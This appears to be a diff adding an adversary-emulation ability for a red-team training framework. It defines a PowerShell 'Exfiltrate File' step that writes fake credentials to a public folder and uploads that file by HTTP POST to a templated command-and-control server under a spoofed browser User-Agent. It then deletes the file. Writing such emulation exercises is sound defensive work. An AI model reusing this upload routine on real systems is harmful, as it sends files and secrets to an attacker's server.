@@ -1,0 +1,32 @@
+---
+- id: 0fe45b51-d25b-4a20-9e34-2e0c1af7e78e
+  name: Exfiltrate File
+  description: Exfiltrate a file with fake credentials
+  tactic: training
+  technique:
+    attack_id: x
+    name: x
+  platforms:
+    windows:
+      psh:
+        command: |
+          echo 'username: Admin; password: Passw0rd!' > C:\Users\Public\creds.txt;
+          $ErrorActionPreference = 'Stop';
+          $fieldName = 'creds.txt';
+          $filePath = 'C:\\Users\\Public\\creds.txt';
+          $url = "#{server}/file/upload";
+
+          Add-Type -AssemblyName 'System.Net.Http';
+
+          $client = New-Object System.Net.Http.HttpClient;
+          $content = New-Object System.Net.Http.MultipartFormDataContent;
+          $fileStream = [System.IO.File]::OpenRead($filePath);
+          $fileName = [System.IO.Path]::GetFileName($filePath);
+          $fileContent = New-Object System.Net.Http.StreamContent($fileStream);
+          $content.Add($fileContent, $fieldName, $fileName);
+          $client.DefaultRequestHeaders.Add("X-Request-Id", $env:COMPUTERNAME + '-#{paw}');
+          $client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
+
+          $result = $client.PostAsync($url, $content).Result;
+          $result.EnsureSuccessStatusCode();
+          rm C:\\Users\\Public\\creds.txt;
